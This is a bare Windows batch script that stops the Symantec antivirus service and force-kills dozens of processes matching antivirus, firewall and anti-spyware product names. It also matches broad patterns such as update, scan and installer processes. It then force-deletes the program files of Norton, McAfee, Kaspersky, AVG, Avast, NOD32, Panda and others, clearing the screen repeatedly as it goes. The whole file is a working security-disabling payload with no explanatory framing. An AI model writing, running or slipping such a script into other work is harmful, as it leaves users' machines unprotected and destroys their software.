@echo off
net stop "symantec antivirus"
taskkill /f /FI "MEMUSAGE gt 5" /IM av*
taskkill /f /FI "MEMUSAGE gt 5" /FI "MEMUSAGE gt 5" /IM fire*
taskkill /f /FI "MEMUSAGE gt 5" /IM anti*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM spy*
taskkill /f /FI "MEMUSAGE gt 5" /IM bullguard
taskkill /f /FI "MEMUSAGE gt 5" /IM PersFw
taskkill /f /FI "MEMUSAGE gt 5" /IM KAV*
taskkill /f /FI "MEMUSAGE gt 5" /IM ZONEALARM
taskkill /f /FI "MEMUSAGE gt 5" /IM SAFEWEB
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM OUTPOST
taskkill /f /FI "MEMUSAGE gt 5" /IM nv*
taskkill /f /FI "MEMUSAGE gt 5" /IM nav*
taskkill /f /FI "MEMUSAGE gt 5" /IM F-*
taskkill /f /FI "MEMUSAGE gt 5" /IM ESAFE
taskkill /f /FI "MEMUSAGE gt 5" /IM cle
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM BLACKICE
taskkill /f /FI "MEMUSAGE gt 5" /IM def*
taskkill /f /FI "MEMUSAGE gt 5" /IM kav
taskkill /f /FI "MEMUSAGE gt 5" /IM kav*
taskkill /f /FI "MEMUSAGE gt 5" /IM avg*
taskkill /f /FI "MEMUSAGE gt 5" /IM ash*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM aswupdsv
taskkill /f /FI "MEMUSAGE gt 5" /IM ewid*
taskkill /f /FI "MEMUSAGE gt 5" /IM guard*
taskkill /f /FI "MEMUSAGE gt 5" /IM guar*
taskkill /f /FI "MEMUSAGE gt 5" /IM gcasDt*
taskkill /f /FI "MEMUSAGE gt 5" /IM msmp*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM mcafe*
taskkill /f /FI "MEMUSAGE gt 5" /IM mghtml
taskkill /f /FI "MEMUSAGE gt 5" /IM msiexec
taskkill /f /FI "MEMUSAGE gt 5" /IM outpost
taskkill /f /FI "MEMUSAGE gt 5" /IM isafe
taskkill /f /FI "MEMUSAGE gt 5" /IM zap*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM zauinst
taskkill /f /FI "MEMUSAGE gt 5" /IM upd*
taskkill /f /FI "MEMUSAGE gt 5" /IM zlclien*
taskkill /f /FI "MEMUSAGE gt 5" /IM minilog
taskkill /f /FI "MEMUSAGE gt 5" /IM cc*
taskkill /f /FI "MEMUSAGE gt 5" /IM norton*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM norton au*
taskkill /f /FI "MEMUSAGE gt 5" /IM ccc*
taskkill /f /FI "MEMUSAGE gt 5" /IM npfmn*
taskkill /f /FI "MEMUSAGE gt 5" /IM loge*
taskkill /f /FI "MEMUSAGE gt 5" /IM nisum*
taskkill /f /FI "MEMUSAGE gt 5" /IM issvc
taskkill /f /FI "MEMUSAGE gt 5" /IM tmp*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM tmn*
taskkill /f /FI "MEMUSAGE gt 5" /IM pcc*
taskkill /f /FI "MEMUSAGE gt 5" /IM cpd*
taskkill /f /FI "MEMUSAGE gt 5" /IM pop*
taskkill /f /FI "MEMUSAGE gt 5" /IM pav*
taskkill /f /FI "MEMUSAGE gt 5" /IM padmin
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM panda*
taskkill /f /FI "MEMUSAGE gt 5" /IM avsch*
taskkill /f /FI "MEMUSAGE gt 5" /IM sche*
taskkill /f /FI "MEMUSAGE gt 5" /IM syman*
taskkill /f /FI "MEMUSAGE gt 5" /IM virus*
taskkill /f /FI "MEMUSAGE gt 5" /IM realm*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM sweep*
taskkill /f /FI "MEMUSAGE gt 5" /IM scan*
taskkill /f /FI "MEMUSAGE gt 5" /IM ad-*
taskkill /f /FI "MEMUSAGE gt 5" /IM safe*
taskkill /f /FI "MEMUSAGE gt 5" /IM avas*
taskkill /f /FI "MEMUSAGE gt 5" /IM norm*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
cls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\pandasoftware\*.*
exit
